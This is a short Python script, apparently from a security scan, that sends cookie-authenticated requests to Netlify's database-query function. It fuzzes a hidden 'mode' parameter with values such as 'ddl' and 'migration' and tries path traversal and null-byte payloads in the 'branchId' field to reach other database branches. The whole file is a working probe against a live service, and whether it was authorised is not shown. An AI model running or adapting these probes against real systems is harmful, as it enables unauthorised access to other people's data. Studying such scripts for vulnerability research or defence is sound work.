# -*- coding: utf-8 -*-
"""收尾:① mode 参数(JS 泄露 query 带 mode) ② branchId 路径穿越格式
"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A

ctx = ssl.create_default_context()


def dbq(body, timeout=45):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': COOKIE_A}
    conn.request('POST', '/.netlify/functions/database-query', body=json.dumps(body).encode(), headers=h)
    try:
        r = conn.getresponse()
        raw = r.read()
        enc = r.getheader('Content-Encoding')
        if enc == 'br':
            raw = brotli.decompress(raw)
        elif enc == 'gzip':
            raw = gzip.decompress(raw)
        st, out = r.status, raw[:500].decode('utf-8', 'ignore')
    except Exception as e:
        st, out = -1, 'EXC %r' % e
    finally:
        conn.close()
    return st, out


def t(label, body):
    st, out = dbq(body)
    print('%-46s [%d] %s' % (label, st, out.replace('\n', ' | ')[:300]))


print('== mode 参数变体 ==')
for mode in ['readonly', 'explain', 'analyze', 'ddl', 'migration', 'setup']:
    t('mode=%s' % mode, {'siteId': SITE_A, 'action': 'query', 'sql': 'select current_user::text', 'mode': mode})
print()
print('== branchId 路径穿越格式 ==')
for bid in ['production/../../production', 'production/..', '..%2Fproduction', 'production%00', 'prod*uction',
            'production/../../sites/%s/database/branch/production' % SITE_A]:
    t('branchId=%s' % bid, {'siteId': SITE_A, 'branchId': bid, 'action': 'query', 'sql': 'select 1'})
